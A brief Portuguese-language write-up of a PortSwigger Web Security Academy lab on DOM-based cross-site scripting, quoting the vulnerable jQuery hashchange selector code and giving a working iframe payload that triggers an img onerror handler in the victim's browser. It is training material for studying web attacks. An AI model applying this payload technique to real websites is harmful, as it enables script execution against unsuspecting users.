#ctf 

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event

A página tem uma função de hashchange que pega o que está depois do `#` na URL e scrolla para a seção.

```html
<script>
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
if (post) post.get(0).scrollIntoView();
});
</script>
```

É possível passar um script que vai ser executado para nós mesmos, porém se enviasse este link com o payload para um usuário, não seria executado. Isso porque o jQuery vai abrir a página, buscar pelo valor do hash e não vai encontrar, então nada vai acontecer.

Uma forma deste payload ser executado automaticamente é usando `iframe` na nossa página e mandar o link para o usuário. Para resolver o exercicio basta ir no **exploit server**, colar o payload no `body` e enviar o link para o usuário.

```html
<iframe src="https://ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

GG